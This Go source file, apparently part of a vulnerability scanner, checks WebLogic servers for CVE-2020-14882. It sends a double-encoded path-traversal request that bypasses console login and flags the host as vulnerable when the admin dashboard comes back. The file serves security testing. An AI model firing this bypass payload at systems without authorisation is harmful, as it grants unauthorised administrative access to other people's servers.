package weblogic

import (
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
	"strings"
)

func CVE_2020_14882(url string) bool {
	if req, err := httpx.Request(url+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=a", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "/console/dashboard") {
			logging.Logger.Infoln("[Vulnerable] CVE_2020_14882 ", url)
			return true
		}
	}
	logging.Logger.Debugln("[Safety] CVE_2020_14882 ", url)
	return false
}
